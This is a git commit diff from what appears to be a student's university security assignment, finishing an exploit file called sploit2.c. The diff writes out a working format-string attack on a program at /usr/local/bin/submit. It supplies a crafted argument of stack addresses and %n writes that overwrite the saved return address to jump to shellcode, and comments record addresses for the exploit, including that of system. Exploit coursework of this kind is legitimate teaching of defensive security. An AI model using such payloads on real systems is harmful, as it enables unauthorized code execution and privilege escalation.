b87afae196e3f2ba254ae1c8f7e9fd1dd188f885
b7song <b7song@student.cs.uwaterloo.ca>
2017-06-02 14:32:57 -0400

    sploit2 done

--- a1/sploit2.c
+++ a1/sploit2.c
@@ -8,17 +8,24 @@
 int main(void) {
   char *args[4], *env[1];
 
-  int load_size = 140 + 1 - strlen("Submission program version 0.1 (") + 4;
-  int i;
+  int load_size = 140 - strlen("Submission program version 0.1 (") + 4;
 
   args[0] = (char*) malloc(load_size + 1);
-  strcpy(args[0], "AAAA");
-  for(i = 0; i < (load_size-5)/5; i++) {
-    strcat(args[0], "%%08x.");
-  }
+  strcpy(args[0], "\xac\xdd\xbf\xff.AAA\xad\xdd\xbf\xff.AAA\xae\xdd\xbf\xff.AAA\xaf\xdd\xbf\xff%124x%15$n%039x%17$n%224x%19$n%064x%21$n");
+  // eip saved at 0xffbfddac
+  // sprintf
+  // 0x0804b388
+  // printf
+  // 0x0804b35c
+  // DTOR_END
+  // 0x0804b228
+  // print_version
+  // 0x08048c10
+  // system
+  // 0x4005a790
 
-  strcpy(args[0], "AAAA_%15$x");
-  // 0xffbfdf04
+  // shellcode
+  // 0xffbfdfb8
 
   args[1] = "-v";
   args[2] = shellcode;
@@ -28,3 +35,4 @@ int main(void) {
 
   return execve("/usr/local/bin/submit", args, env);
 }
+
